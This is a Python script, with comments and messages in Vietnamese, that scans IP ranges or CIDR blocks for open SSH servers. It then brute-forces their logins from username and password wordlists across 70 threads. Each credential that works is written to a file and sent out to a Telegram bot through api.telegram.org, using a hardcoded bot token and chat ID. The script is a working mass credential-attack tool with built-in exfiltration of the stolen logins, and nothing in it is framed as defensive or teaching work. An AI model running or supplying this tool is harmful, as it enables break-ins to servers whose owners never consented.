import socket
import ipaddress
import argparse
import time
import random
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException

# ==== CONFIG HERE ====
TELEGRAM_TOKEN = "8117259415:AAFLC0_9GYp0LHwEOhOSfIgwKFncYJzY2nQ"
TELEGRAM_CHAT_ID = "7816681280"
MAX_THREADS = 70  # ⚡ Song song tối đa 70 luồng để hiệu quả cao nhất

# ==== GLOBAL LOCK ====
lock = threading.Lock()

# ==== USER/PASS LOAD ====
def read_file(path):
    try:
        with open(path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

usernames = read_file("users.txt") or ["root"]
passwords = read_file("pass.txt")

# ==== NOTIFY ====
def send_telegram_log(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        requests.post(url, data=data, timeout=3)
    except Exception as e:
        print(f"[!] Telegram error: {e}")

# ==== SSH CHECK ====
def ssh_login(ip, port, username, password):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh.connect(ip, port=port, username=username, password=password, timeout=4)
        msg = f"[SSH SUCCESS]\n{ip}:{port}\nUser: {username}\nPass: {password}"
        print(msg)
        send_telegram_log(msg)
        with lock:
            with open("success.txt", "a") as f:
                f.write(f"{ip}:{port} | {username} | {password}\n")
        ssh.close()
        return True
    except AuthenticationException:
        return False
    except (SSHException, socket.error):
        return False
    finally:
        ssh.close()

# ==== BRUTE WORKER ====
def brute_worker(ip, username):
    for password in passwords:
        if ssh_login(ip, 22, username, password):
            return
        time.sleep(random.uniform(0.02, 0.08))  # Delay nhẹ để tăng tỉ lệ thành công

# ==== SCAN ====
def scan_ssh(ip, port=22, timeout=0.8):
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        banner = sock.recv(50).decode(errors='ignore')
        sock.close()
        return "SSH" in banner or banner.startswith("SSH")
    except:
        return False

def generate_targets(ip_range=None, cidr=None, file=None):
    targets = []
    if file:
        targets = read_file(file)
    elif ip_range:
        start_ip, end_ip = ip_range.split("-")
        start = int(ipaddress.IPv4Address(start_ip))
        end = int(ipaddress.IPv4Address(end_ip))
        targets = [str(ipaddress.IPv4Address(ip)) for ip in range(start, end + 1)]
    elif cidr:
        targets = [str(ip) for ip in ipaddress.IPv4Network(cidr, strict=False).hosts()]
    return targets

# ==== MAIN ====
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--range", help="Dải IP, vd: 192.168.1.1-192.168.1.100")
    parser.add_argument("--cidr", help="CIDR, vd: 10.0.0.0/24")
    parser.add_argument("--file", help="File chứa danh sách IP")
    parser.add_argument("--threads", type=int, default=MAX_THREADS, help="Số luồng brute song song (mặc định: 70)")
    args = parser.parse_args()

    if not passwords:
        print("❌ File pass.txt trống hoặc không tồn tại!")
        return

    targets = generate_targets(args.range, args.cidr, args.file)
    if not targets:
        print("❌ Không có IP nào để quét!")
        return

    print(f"🔍 Đang scan {len(targets)} IP...")
    alive = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as exec:
        futures = {exec.submit(scan_ssh, ip): ip for ip in targets}
        for future in as_completed(futures):
            ip = futures[future]
            if future.result():
                print(f"[+] SSH mở: {ip}")
                alive.append(ip)

    print(f"⚡ Bắt đầu brute {len(alive)} IP với tối đa {MAX_THREADS} luồng...")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as exec:
        for ip in alive:
            for username in usernames:
                exec.submit(brute_worker, ip, username)

if __name__ == "__main__":
    main()
